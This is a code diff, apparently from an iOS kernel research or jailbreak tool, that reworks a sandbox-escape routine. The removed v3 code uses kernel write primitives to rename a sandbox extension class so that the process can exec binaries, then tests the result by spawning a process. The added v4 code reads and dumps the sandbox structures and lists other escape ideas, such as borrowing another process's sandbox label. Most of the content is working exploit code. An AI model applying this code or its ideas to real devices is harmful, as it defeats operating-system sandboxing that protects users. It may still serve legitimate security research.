@@ -2527,54 +2527,58 @@ char *kresearch_dump_extensions(void) {
 
 char *kresearch_patch_exec(void) {
     buf_init();
-    buf_append("=== PATCH EXEC v3: Rename existing class_node (safe) ===\n\n");
-    buf_append("Strategy: Pick one of the many read-write class_nodes and change\n");
-    buf_append("its class_name pointer to point to \"com.apple.sandbox.executable\".\n");
-    buf_append("This is just ONE 8-byte pointer write — no new structs, no buffer overflow.\n\n");
+    bc_init();
+    buf_append("=== PATCH EXEC v4: READ-ONLY ANALYSIS ===\n\n");
+    buf_append("Previous v3 caused kernel panic by writing into live extension data\n");
+    buf_append("buffers. This version only READS and ANALYZES — no kwrite calls.\n\n");
+    bc("patch_exec v4 starting (read-only)\n");
 
     uint64_t self_proc = proc_self();
     if (!self_proc) {
         buf_append("ABORT: proc_self() returned NULL\n");
+        bc("ABORT: proc_self NULL\n");
+        bc_close();
         return buf_finish();
     }
     uint64_t label = proc_get_cred_label(self_proc);
     if (!label) {
         buf_append("ABORT: proc_get_cred_label returned NULL\n");
+        bc("ABORT: label NULL\n");
+        bc_close();
         return buf_finish();
     }
     uint64_t sbx = label_get_sandbox(label);
     if (!sbx) {
         buf_append("ABORT: label_get_sandbox returned NULL\n");
+        bc("ABORT: sandbox NULL\n");
+        bc_close();
         return buf_finish();
     }
+    bc("sandbox_label @ 0x%llx\n", sbx);
 
     struct sandbox_label sbx_lbl = {0};
     kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
     uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
     if (!ext_set_kptr) {
         buf_append("ABORT: extension_set is NULL\n");
+        bc("ABORT: ext_set NULL\n");
+        bc_close();
         return buf_finish();
     }
     buf_append("extension_set @ 0x%llx\n", ext_set_kptr);
+    bc("ext_set @ 0x%llx\n", ext_set_kptr);
 
     // Read the extension_set (16 bucket pointers)
     uint64_t buckets[SANDBOX_EXT_NUM_BUCKETS];
     kreadbuf(ext_set_kptr, buckets, sizeof(buckets));
 
-    // ── Phase 1: Scan all buckets using LARA class_node layout ──
-    // Find a read-write class_node we can rename to "executable".
-    // We want one that's NOT the last read-write one (keep filesystem access).
-    // LARA layout: next=+0x00, ext=+0x08, class_name=+0x10, count=+0x18
+    // ── Phase 1: Scan all 16 buckets ──
+    buf_append("\n--- Extension Bucket Analysis ---\n");
+    bc("scanning %d buckets\n", SANDBOX_EXT_NUM_BUCKETS);
 
-    typedef struct {
-        uint64_t cn_ptr;       // class_node kernel address
-        uint64_t ext_ptr;      // extension list head
-        uint64_t classname_ptr; // original class_name pointer
-        int bucket;
-    } rw_entry;
-
-    rw_entry rw_nodes[SANDBOX_EXT_NUM_BUCKETS];
     int rw_count = 0;
+    int total_classes = 0;
+    int total_exts = 0;
 
     for (int i = 0; i < SANDBOX_EXT_NUM_BUCKETS; i++) {
         if (!buckets[i]) {
@@ -2587,131 +2591,96 @@ char *kresearch_patch_exec(void) {
 
         uint64_t cn_classname = *(uint64_t *)(cn_raw + CN_OFF_CLASSNAME);
         uint64_t cn_ext       = *(uint64_t *)(cn_raw + CN_OFF_EXT);
+        uint64_t cn_count     = *(uint64_t *)(cn_raw + CN_OFF_COUNT);
 
         char name[256] = {0};
         if (cn_classname >= VM_MIN_KERNEL_ADDRESS && cn_classname <= VM_MAX_KERNEL_ADDRESS) {
             kreadbuf(cn_classname, name, 255);
         }
 
-        buf_append("  bucket[%d]: class=\"%s\" cn=0x%llx\n", i, name, buckets[i]);
+        buf_append("  bucket[%d]: class=\"%s\" cn=0x%llx count=%llu\n",
+                   i, name, buckets[i], (unsigned long long)cn_count);
+        total_classes++;
 
-        if (strstr(name, "read-write")) {
-            rw_nodes[rw_count].cn_ptr = buckets[i];
-            rw_nodes[rw_count].ext_ptr = cn_ext;
-            rw_nodes[rw_count].classname_ptr = cn_classname;
-            rw_nodes[rw_count].bucket = i;
-            rw_count++;
+        if (strstr(name, "read-write")) rw_count++;
+
+        // Count extensions in this bucket
+        uint64_t ext = cn_ext;
+        int ext_count = 0;
+        while (ext && ext >= VM_MIN_KERNEL_ADDRESS && ext <= VM_MAX_KERNEL_ADDRESS && ext_count < 20) {
+            uint8_t eraw[EXT_RAW_SIZE];
+            kreadbuf(ext, eraw, EXT_RAW_SIZE);
+
+            uint64_t data_ptr = *(uint64_t *)(eraw + EXT_OFF_DATA);
+            uint64_t data_len = *(uint64_t *)(eraw + EXT_OFF_DATALEN);
+            char path[128] = {0};
+            if (data_ptr >= VM_MIN_KERNEL_ADDRESS && data_ptr <= VM_MAX_KERNEL_ADDRESS) {
+                kreadbuf(data_ptr, path, sizeof(path) - 1);
+            }
+            buf_append("    ext[%d]: data=0x%llx len=%llu path=\"%.60s\"\n",
+                       ext_count, data_ptr, (unsigned long long)data_len, path);
+
+            ext = *(uint64_t *)(eraw + 0x00); // next
+            ext_count++;
+            total_exts++;
         }
     }
 
-    buf_append("\nFound %d read-write class_nodes\n", rw_count);
+    buf_append("\nSummary: %d classes, %d extensions, %d read-write nodes\n",
+               total_classes, total_exts, rw_count);
+    bc("found %d classes, %d exts, %d rw\n", total_classes, total_exts, rw_count);
 
-    if (rw_count < 2) {
-        buf_append("ABORT: Need at least 2 read-write nodes (keep 1 for filesystem).\n");
-        buf_append("Only found %d. Cannot safely rename one.\n", rw_count);
-        return buf_finish();
-    }
-
-    // Use the LAST read-write node (least likely to be the primary one)
-    rw_entry *victim = &rw_nodes[rw_count - 1];
-    buf_append("Renaming bucket[%d] class_node @ 0x%llx\n", victim->bucket, victim->cn_ptr);
-    buf_append("  original class_name ptr: 0x%llx\n", victim->classname_ptr);
-
-    // ── Phase 2: Write the exec class name string into the extension's data buffer ──
-    // Read the victim's extension to find its data_ptr (LARA +0x40)
-    uint8_t ext_raw[EXT_RAW_SIZE];
-    kreadbuf(victim->ext_ptr, ext_raw, EXT_RAW_SIZE);
-    uint64_t data_ptr = *(uint64_t *)(ext_raw + EXT_OFF_DATA);
-
-    if (!data_ptr || data_ptr < VM_MIN_KERNEL_ADDRESS) {
-        buf_append("ABORT: data_ptr is invalid (0x%llx)\n", data_ptr);
-        return buf_finish();
-    }
-
-    // The data buffer has "/" at the start (2 bytes). Write exec class name at +4.
-    // "com.apple.sandbox.executable\0" = 29 bytes, fits at +4 through +32.
-    // This is well within any container path buffer (typically 80+ bytes).
-    const char *exec_class = "com.apple.sandbox.executable";
-    uint64_t exec_class_addr = data_ptr + 4;
-
-    buf_append("  data_ptr: 0x%llx\n", data_ptr);
-    buf_append("  writing \"%s\" at data_ptr+4 (0x%llx)...\n", exec_class, exec_class_addr);
-    kwritebuf(exec_class_addr, (void *)exec_class, strlen(exec_class) + 1);
-
-    // Verify
-    char verify_str[64] = {0};
-    kreadbuf(exec_class_addr, verify_str, 63);
-    buf_append("  verify: \"%s\" %s\n", verify_str,
-               strcmp(verify_str, exec_class) == 0 ? "OK" : "MISMATCH!");
-    if (strcmp(verify_str, exec_class) != 0) {
-        buf_append("ABORT: string write verification failed\n");
-        return buf_finish();
-    }
-
-    // ── Phase 3: Change the class_node's class_name pointer ──
-    // This is the only structural change: write 8 bytes at class_node + 0x10
-    uint64_t cn_classname_field = victim->cn_ptr + CN_OFF_CLASSNAME;
-    buf_append("\nWriting new class_name ptr 0x%llx → cn+0x10 (0x%llx)...\n",
-               exec_class_addr, cn_classname_field);
-
-    // Safety: read-back the current value first
-    uint64_t old_cn_val = kread64(cn_classname_field);
-    buf_append("  old value: 0x%llx\n", old_cn_val);
-
-    kwrite64(cn_classname_field, exec_class_addr);
-
-    uint64_t new_cn_val = kread64(cn_classname_field);
-    buf_append("  new value: 0x%llx %s\n", new_cn_val,
-               new_cn_val == exec_class_addr ? "OK" : "MISMATCH!");
-
-    // Verify by reading the class name through the pointer
-    char verify_cn_name[64] = {0};
-    kreadbuf(new_cn_val, verify_cn_name, 63);
-    buf_append("  class_name now reads: \"%s\"\n", verify_cn_name);
-
-    // ── Phase 4: Test ──
-    buf_append("\n=== TESTING ===\n");
-
+    // ── Phase 2: Check current sandbox state ──
+    buf_append("\n--- Current Sandbox Checks ---\n");
     pid_t pid = getpid();
 
-    int exec_check = sandbox_check(pid, "process-exec",
-                                   SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                   "/bin/sh");
-    buf_append("sandbox_check(process-exec, /bin/sh) = %d %s\n",
-               exec_check, exec_check == 0 ? "ALLOWED!" : "DENIED");
+    int exec_sh = sandbox_check(pid, "process-exec",
+                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    int exec_df = sandbox_check(pid, "process-exec",
+                                SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/df");
+    int fork_ck = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
+    int signal_ck = sandbox_check(pid, "process-exec*",
+                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/usr/bin/id");
 
-    exec_check = sandbox_check(pid, "process-exec",
-                               SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                               "/bin/df");
-    buf_append("sandbox_check(process-exec, /bin/df) = %d %s\n",
-               exec_check, exec_check == 0 ? "ALLOWED!" : "DENIED");
+    buf_append("process-exec /bin/sh:  %d (%s)\n", exec_sh,  exec_sh  == 0 ? "ALLOWED" : "DENIED");
+    buf_append("process-exec /bin/df:  %d (%s)\n", exec_df,  exec_df  == 0 ? "ALLOWED" : "DENIED");
+    buf_append("process-fork:          %d (%s)\n", fork_ck,  fork_ck  == 0 ? "ALLOWED" : "DENIED");
+    buf_append("process-exec* /usr/bin/id: %d (%s)\n", signal_ck,
+               signal_ck == 0 ? "ALLOWED" : "DENIED");
 
-    int fork_check = sandbox_check(pid, "process-fork",
-                                   SANDBOX_CHECK_NO_REPORT);
-    buf_append("sandbox_check(process-fork) = %d %s\n",
-               fork_check, fork_check == 0 ? "ALLOWED!" : "DENIED");
+    bc("exec=/bin/sh:%d /bin/df:%d fork:%d\n", exec_sh, exec_df, fork_ck);
 
-    // Try posix_spawn ONLY with /bin/df (known to exist)
-    buf_append("\nposix_spawn(/bin/df)...\n");
-    {
-        pid_t child = 0;
-        char *argv[] = {"/bin/df", NULL};
-        extern char **environ;
-        int spawn_ret = posix_spawn(&child, "/bin/df", NULL, NULL, argv, environ);
-        buf_append("  returned: %d (%s)\n", spawn_ret, strerror(spawn_ret));
-        if (spawn_ret == 0) {
-            buf_append("  *** CHILD PID: %d — SPAWN SUCCEEDED! ***\n", child);
-            int status = 0;
-            waitpid(child, &status, 0);
-            buf_append("  exit status: %d\n", WEXITSTATUS(status));
-        }
+    // ── Phase 3: Analysis ──
+    buf_append("\n--- Analysis ---\n");
+    buf_append("The v3 approach (renaming a class_node) caused kernel panics because:\n");
+    buf_append("1. Writing into a live extension's data_ptr buffer corrupts the extension\n");
+    buf_append("2. The sandbox kernel code walks these structures and panics on corruption\n");
+    buf_append("3. The class_name rename itself might work, but the data buffer write is fatal\n\n");
+
+    buf_append("Possible alternative approaches:\n");
+    buf_append("- Extension class names may be checked by hash, not string compare\n");
+    buf_append("- process-exec may be profile-only (not extension-based)\n");
+    buf_append("- sandbox_label flags at +0x50/+0x58 might control exec permission\n");
+    buf_append("- Borrowing a different process's entire sandbox_label might work\n");
+    buf_append("  (if SPTM doesn't protect the label pointer itself)\n\n");
+
+    // ── Phase 4: Read sandbox_label flags for analysis ──
+    buf_append("--- sandbox_label raw dump ---\n");
+    uint8_t lbl_raw[0x70];
+    kreadbuf(sbx, lbl_raw, sizeof(lbl_raw));
+    for (int off = 0; off < 0x70; off += 8) {
+        uint64_t val = *(uint64_t *)(lbl_raw + off);
+        buf_append("  +0x%02x: 0x%016llx", off, val);
+        if (off == 0x00) buf_append("  <- profile_ptr");
+        if (off == 0x10) buf_append("  <- extension_set");
+        if (off == 0x50) buf_append("  <- flags?");
+        if (off == 0x58) buf_append("  <- flags2?");
+        buf_append("\n");
     }
 
-    buf_append("\nOriginal class_name ptr was 0x%llx\n", old_cn_val);
-    buf_append("To restore: use sandbox_label_write or kernel_write to write\n");
-    buf_append("0x%llx to address 0x%llx\n", old_cn_val, cn_classname_field);
-
-    buf_append("\n=== PATCH EXEC v3 COMPLETE ===\n");
+    buf_append("\n=== PATCH EXEC v4 COMPLETE (no writes, no panics) ===\n");
+    bc("patch_exec v4 complete\n");
+    bc_close();
     return buf_finish();
 }
 
